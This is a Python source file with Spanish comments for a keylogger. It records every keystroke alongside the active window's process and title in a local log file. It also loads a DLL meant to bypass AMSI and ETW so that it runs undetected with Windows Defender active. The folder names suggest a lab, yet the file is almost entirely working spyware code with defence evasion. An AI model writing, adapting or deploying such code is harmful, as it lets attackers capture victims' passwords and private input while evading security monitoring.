# ============================================================
# keylogger_con_bypass.py
# Keylogger con contexto + bypass AMSI/ETW
# Ejecuta con Defender activo, sin exclusiones
# ============================================================

import ctypes
import os
import sys
import threading
from datetime import datetime

try:
    from pynput import keyboard
    import win32gui
    import win32process
    import psutil
except ImportError as e:
    print(f"[!] Falta dependencia: {e}")
    print("[*] Ejecuta: pip install pynput pywin32 psutil")
    sys.exit(1)

# ============================================================
# CONFIGURACIÓN
# ============================================================
LAB_DIR = r"C:\LabKeylogger"
LOG_FILE = os.path.join(LAB_DIR, "04_logs", "captura_con_bypass.txt")
DLL_PATH = os.path.join(LAB_DIR, "03_compilado", "AmsiEtwBypass.dll")

# ============================================================
# CARGAR DLL DE BYPASS
# ============================================================
def load_bypass():
    if not os.path.exists(DLL_PATH):
        print(f"[!] DLL no encontrada: {DLL_PATH}")
        return None

    try:
        dll = ctypes.CDLL(DLL_PATH)
        dll.InitializeBypass.restype = ctypes.c_bool
        result = dll.InitializeBypass()

        if result:
            print("[+] Bypass AMSI/ETW activo")
            return dll
        else:
            print("[!] La DLL no pudo inicializar el bypass")
            return None
    except Exception as e:
        print(f"[!] Error al cargar DLL: {e}")
        return None

# ============================================================
# KEYLOGGER
# ============================================================
ventana_actual = ""
lock = threading.Lock()

def get_ventana_activa():
    try:
        hwnd = win32gui.GetForegroundWindow()
        titulo = win32gui.GetWindowText(hwnd)
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        proc = psutil.Process(pid).name()
        return f"{proc} - {titulo}"
    except:
        return "desconocida"

def escribir_log(texto):
    with lock:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(texto)

def on_press(key):
    global ventana_actual
    ventana = get_ventana_activa()

    if ventana != ventana_actual:
        ventana_actual = ventana
        escribir_log(f"\n\n[VENTANA: {ventana}]\n")

    try:
        escribir_log(key.char)
    except AttributeError:
        if key == keyboard.Key.enter:
            escribir_log("\n")
        elif key == keyboard.Key.space:
            escribir_log(" ")
        elif key == keyboard.Key.tab:
            escribir_log("\t")
        elif key == keyboard.Key.backspace:
            escribir_log("[BS]")

def on_release(key):
    if key == keyboard.Key.esc:
        escribir_log(f"\n\n--- Fin: {datetime.now()} ---\n")
        print("\n[!] Keylogger detenido con ESC")
        return False

# ============================================================
# MAIN
# ============================================================
if __name__ == "__main__":
    print("=" * 60)
    print("  KEYLOGGER CON BYPASS - DEFENDER ACTIVO")
    print("=" * 60)

    dll = load_bypass()
    if not dll:
        print("[!] Continuando sin bypass")

    print(f"\n[*] Guardando en: {LOG_FILE}")
    print("[*] Presiona ESC para detener\n")

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if dll:
        dll.CleanupBypass()

    print("[*] Sesión finalizada")